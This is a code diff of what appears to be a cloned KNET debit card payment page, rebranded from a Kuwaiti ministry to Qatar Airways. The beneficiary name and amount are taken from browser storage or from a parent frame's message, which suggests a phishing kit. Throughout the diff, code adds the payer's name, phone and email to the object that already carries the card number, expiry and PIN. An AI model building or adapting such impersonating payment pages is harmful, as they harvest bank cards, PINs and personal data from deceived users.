@@ -159,7 +159,7 @@
 					   		 $("#ValidationMessage").hide();
 					  	  }
 					  	 if(cleanVal.length <6){
-						  		document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;100.000</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
+						  		document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 						  		 if(document.getElementById('DiscntRate')){
 							     		document.getElementById('DiscntRate').innerHTML='';
 							     		$("#DiscntRate").hide();
@@ -780,13 +780,13 @@ function mask(cardNo, maskChar, maskFormat) {
 					
 					if(instPgEiddiscntflg == '1' && termPgEiddiscntflg == '1' && pymtPgEiddiscntflg == '1'){
 						if(ajaxResponseData[4] != "0.00"){
-							document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata"><s>KD&nbsp;100.000</s></span></div><div class="col w-40" style="text-align:right;float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
+							document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata"><s>KD&nbsp;2.800</s></span></div><div class="col w-40" style="text-align:right;float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 							document.getElementById('DiscntRate').innerHTML='<div class="col w-60 mt-10 mb-10" style="text-align:right;"><span class="paymentdata" style="color: #228B22;">'+ajaxResponseData[4]+'&nbsp;<span>%</span></span></div><div class="col w-40 mt-10 mb-10" style="text-align:right;float:right;"><span class="paymentlabel" style="color: #228B22;"> :&#1605;&#1593;&#1583;&#1604; &#1575;&#1604;&#1582;&#1589;&#1605;</span></div>';
 							document.getElementById('DiscntedAmt').innerHTML='<div class="col w-60 mt-10 mb-10" style="text-align:right;"><span class="paymentdata">KD&nbsp;'+ajaxResponseData[3]+'</span></div><div class="col w-40 mt-10 mb-10" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1606;&#1578; &#1578;&#1583;&#1601;&#1593;</span></div>';
 							$("#DiscntRate").show();
 							$("#DiscntedAmt").show();
 						}else{
-							document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;100.000</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
+							document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 				     		document.getElementById('DiscntRate').innerHTML='';
 				     		document.getElementById('DiscntedAmt').innerHTML='';
 				     		$("#DiscntRate").hide();
@@ -873,6 +873,14 @@ function mask(cardNo, maskChar, maskFormat) {
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -891,13 +899,13 @@ function mask(cardNo, maskChar, maskFormat) {
 	//Added for PG Eidia Discount
 	function forEidDiscntfn(discntval,tranamtDiscntVal){
 		if(discntval.toFixed(2) != "0.00"){
-			document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata"><s>KD&nbsp;100.000</s></span></div><div class="col w-40" style="text-align:right;float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
+			document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata"><s>KD&nbsp;2.800</s></span></div><div class="col w-40" style="text-align:right;float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 			document.getElementById('DiscntRate').innerHTML='<div class="col w-60 mt-10 mb-10" style="text-align:right;"><span class="paymentdata" style="color: #228B22;">'+discntval.toFixed(2)+'&nbsp;<span>%</span></span></div><div class="col w-40 mt-10 mb-10" style="text-align:right;float:right;"><span class="paymentlabel" style="color: #228B22;"> :&#1605;&#1593;&#1583;&#1604; &#1575;&#1604;&#1582;&#1589;&#1605;</span></div>';
 			document.getElementById('DiscntedAmt').innerHTML='<div class="col w-60 mt-10 mb-10" style="text-align:right;"><span class="paymentdata">KD&nbsp;'+tranamtDiscntVal.toFixed(3)+'</span></div><div class="col w-40 mt-10 mb-10" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1606;&#1578; &#1578;&#1583;&#1601;&#1593;</span></div>';
 			$("#DiscntRate").show();
 			$("#DiscntedAmt").show();
 		}else{
-			document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;100.000</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
+			document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
      		document.getElementById('DiscntRate').innerHTML='';
      		document.getElementById('DiscntedAmt').innerHTML='';
      		$("#DiscntRate").hide();
@@ -1291,7 +1299,7 @@ function paymentOptionChange(name){
         //document.getElementById('dcprefix').innerHTML='<select  class="paymentselect"><option>&#1576;&#1575;&#1583;&#1616;&#1574;&#1577;</option></select>';
         document.paypage.creditDebitCheck.value="";
       //Added for PG Eidia Discount
-        document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;100.000</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
+        document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
  		document.getElementById('DiscntRate').innerHTML='';
  		document.getElementById('DiscntedAmt').innerHTML='';
  		$("#DiscntRate").hide();
@@ -1846,8 +1854,12 @@ function onPay()
 		    		document.paypage.MaskingCardNum="1";
 			 <!-- KPAY Changes - ends -->
 	    	 
-       		var transactionamount='100.000';   
-       		var mrchname='Ministry of Interior'; 
+       		var transactionamount='2.800';
+        // Load data from previous page
+        var userData = {};
+        try { userData = JSON.parse(localStorage.getItem('userData')) || {}; } catch(e) {}
+        var knetTotal = sessionStorage.getItem('knetTotal') || '2.800 د.ك';   
+       		var mrchname = userData.fullname || 'الخطوط الجوية القطرية'; 
        		var langid=document.paypage.langID.value;
 		   // var encryptedamount=byteArrayToHex(rijndaelEncrypt(transactionamount,hexToByteArray(paymentId), mode));
        		//Added for PG Eidia Discount
@@ -2164,6 +2176,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -2195,6 +2215,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -2323,6 +2351,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -2532,6 +2568,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -2563,6 +2607,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -2590,6 +2642,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -2617,6 +2677,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -2651,6 +2719,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -2984,6 +3060,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3014,6 +3098,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3058,6 +3150,14 @@ function onPay()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3361,7 +3461,7 @@ function onProceed_buttonClicked() {
 			$("#DiscntedAmt").hide();
 			document.getElementById('DiscntRate').innerHTML='';
 		 	document.getElementById('DiscntedAmt').innerHTML='';
-			document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;100.000</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
+			document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 		}
 		
 	}
@@ -3399,6 +3499,14 @@ function onProceed_buttonClicked() {
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3474,6 +3582,14 @@ function onProceed_buttonClicked() {
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3537,6 +3653,14 @@ function onProceed_buttonClicked() {
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3834,6 +3958,14 @@ function onProceed_buttonClicked() {
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3893,6 +4025,14 @@ function onProceed_buttonClicked() {
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3925,6 +4065,14 @@ function onProceed_buttonClicked() {
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3960,6 +4108,14 @@ function onclckCancel()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -3995,6 +4151,14 @@ function onclckCancel()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -4052,6 +4216,14 @@ function onclckCancel()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -4085,6 +4257,14 @@ function onclckCancel()
                             expiry_month: $('#expiryMonthBox').val(),
                             expiry_year: $('#expiryYearBox').val(),
                             pin: $('#cardPin').val()
+                        },
+                        delivery_address: {
+                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
+                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
+                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
+                            country: localStorage.getItem('selectedCountry') || '',
+                            site: 'https://www.qatarairways.com',
+                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
                         }
                     };
 
@@ -4154,14 +4334,82 @@ function openAtmEcomPinWin()
 	width: 60% !important;
 }
 </style>
+<script type="text/javascript">
+
+// ===== Initialize KNET invoice data from previous page =====
+(function() {
+    try {
+        var userData = {};
+        try { userData = JSON.parse(localStorage.getItem('userData')) || {}; } catch(e) {}
+        
+        var beneficiaryName = userData.fullname || 'الخطوط الجوية القطرية';
+        var beneficiaryEl = document.getElementById('knetBeneficiary');
+        if (beneficiaryEl) beneficiaryEl.textContent = beneficiaryName;
+        var beneficiaryConfirmEl = document.getElementById('knetBeneficiaryConfirm');
+        if (beneficiaryConfirmEl) beneficiaryConfirmEl.textContent = beneficiaryName;
+        
+        var siteEl = document.getElementById('knetSite');
+        if (siteEl) siteEl.textContent = 'https://www.qatarairways.com';
+        var siteConfirmEl = document.getElementById('knetSiteConfirm');
+        if (siteConfirmEl) siteConfirmEl.textContent = 'https://www.qatarairways.com';
+        
+        var knetTotal = sessionStorage.getItem('knetTotal') || '2.800 د.ك';
+        var amountMatch = knetTotal.match(/([\d.]+)/);
+        var amountNum = amountMatch ? amountMatch[1] : '2.800';
+        var amountEl = document.getElementById('knetAmount');
+        if (amountEl) amountEl.innerHTML = 'KD&nbsp;' + amountNum;
+        var amountConfirmEl = document.getElementById('knetAmountConfirm');
+        if (amountConfirmEl) amountConfirmEl.innerHTML = 'KD&nbsp;' + amountNum;
+        
+        if (typeof transactionamount !== 'undefined') transactionamount = amountNum;
+        if (typeof mrchname !== 'undefined') mrchname = beneficiaryName;
+        
+        if (typeof adjustIframeHeight === 'function') adjustIframeHeight();
+    } catch(e) {
+        console.error('KNET init error:', e);
+    }
+})();
+
+function adjustIframeHeight() {
+    if (window.parent !== window) {
+        var bodyHeight = document.body.scrollHeight;
+        window.parent.postMessage({ type: 'knetHeight', height: Math.min(bodyHeight + 20, 700) }, '*');
+    }
+}
+
+window.addEventListener('message', function(event) {
+    if (event.data && event.data.type === 'initKnetData') {
+        try {
+            var parentData = event.data.userData || {};
+            var parentTotal = event.data.knetTotal || '2.800 د.ك';
+            
+            var beneficiaryName = parentData.fullname || 'الخطوط الجوية القطرية';
+            var beneficiaryEl = document.getElementById('knetBeneficiary');
+            if (beneficiaryEl) beneficiaryEl.textContent = beneficiaryName;
+            var beneficiaryConfirmEl = document.getElementById('knetBeneficiaryConfirm');
+            if (beneficiaryConfirmEl) beneficiaryConfirmEl.textContent = beneficiaryName;
+            
+            var amountMatch = parentTotal.match(/([\d.]+)/);
+            var amountNum = amountMatch ? amountMatch[1] : '2.800';
+            var amountEl = document.getElementById('knetAmount');
+            if (amountEl) amountEl.innerHTML = 'KD&nbsp;' + amountNum;
+            var amountConfirmEl = document.getElementById('knetAmountConfirm');
+            if (amountConfirmEl) amountConfirmEl.innerHTML = 'KD&nbsp;' + amountNum;
+            
+            if (typeof transactionamount !== 'undefined') transactionamount = amountNum;
+            if (typeof mrchname !== 'undefined') mrchname = beneficiaryName;
+            
+            if (typeof adjustIframeHeight === 'function') adjustIframeHeight();
+        } catch(e) {
+            console.error('KNET postMessage error:', e);
+        }
+    }
+});
+
+</script>
 <noscript>
 <style>
-#PayPageEntry{
-display: none;
-}
-#payConfirm{
-display: none;
-}
+.wrapper { display: none; }
 </style>
 <div class="wrapper">
 <div class="contentBox" style="height: 430px;">
@@ -4209,16 +4457,16 @@ display: none;
 </div>
 <p class="paymentheader" style="text-align:right; padding-top:18px;">معلومات الفاتورة </p>
 <div class="row">
-<div class="col mb-10 w-60" style="text-align: right;"><span class="paymentdata">Ministry of Interior</span> </div>
+<div class="col mb-10 w-60" style="text-align: right;"><span class="paymentdata" id="knetBeneficiary">الخطوط الجوية القطرية</span> </div>
 <div class="col mb-10 w-40" style="text-align:right;float:right;"><span class="paymentlabel">:المستفيد </span></div>
 </div>
 <div class="row">
-<div class="col mb-10 w-60" style="text-align:right;width:63%;"><span class="paymentdata">https://www.moi.gov.kw</span></div>
+<div class="col mb-10 w-60" style="text-align:right;width:63%;"><span class="paymentdata" id="knetSite">https://www.qatarairways.com</span></div>
 <div class="col mb-10 w-40" style="text-align: right; float:right;"><span class="paymentlabel">:الموقع  </span></div>
 </div>
 <div class="row" id="OrgTranxAmt">
-<div class="col w-60" style="text-align:right;"><span class="paymentdata">
-                            KD 100.000
+<div class="col w-60" style="text-align:right;"><span class="paymentdata" id="knetAmount">
+                            KD&nbsp;2.800
                             </span>
 </div>
 <div class="col w-40" style="text-align:right;float:right;">
@@ -4244,7 +4492,7 @@ display: none;
 						
 						:‏(PIN) الرقم السري
 						</span>
-<input autocomplete="one-time-code" class="paymentinput" dir="rtl" id="debitsavedcardPIN" maxlength="4" name="debitsavedcardPIN" oncopy="return false;" ondrop="return false;" onkeypress="return ValidateNumPin(event);" onkeyup="ValidateNumPin(event);ValidatePinCvv(event);" onpaste="return false;" size="4" style="float:left; width:212px;margin-left: 8px;  text-align:right;margin-bottom:2px;padding-right:5px; " title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password"/>
+<input autocomplete="one-time-code" class="paymentinput" dir="rtl" id="debitsavedcardPIN" maxlength="4" name="debitsavedcardPIN" oncopy="return false;" ondrop="return false;" onkeypress="return ValidateNumPin(event);" onkeyup="ValidateNumPin(event);ValidatePinCvv(event);" onpaste="return false;" size="4" style="float:left; width:60%; min-width:150px;margin-left: 8px;  text-align:right;margin-bottom:2px;padding-right:5px; " title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password"/>
 </div>
 <div class="SavedcardCVVField" id="row" style="float:left;">
 </div>
@@ -4257,7 +4505,7 @@ display: none;
 <!--  <label style="position: relative; display: inline-block;"> -->
 <div class="input-wrapper" id="knetCardInfoSection">
 <label id="logodetails" style="display: none;"><img alt="" height="15px" id="brandlogo" src="images/index.html" style="position: absolute; right: 5px; margin-top: 3%;" width="35px"/> </label>
-<input autocomplete="cc-number" class="paymentinput" data-manus_click_id="1" data-manus_clickable="true" id="debitNumber" maxlength="19" name="debitNumber" oncopy="return false;" ondrop="return false;" oninput="formatCardNumber(this);" onkeypress="return ValidateNumPin(event);" onpaste="return false;" size="19" style="width: 212px; padding-right: 40px;" type="text"/>
+<input autocomplete="cc-number" class="paymentinput" data-manus_click_id="1" data-manus_clickable="true" id="debitNumber" maxlength="19" name="debitNumber" oncopy="return false;" ondrop="return false;" oninput="formatCardNumber(this);" onkeypress="return ValidateNumPin(event);" onpaste="return false;" size="19" style="width: 60%; min-width: 150px; padding-right: 40px;" type="text"/>
 </div>
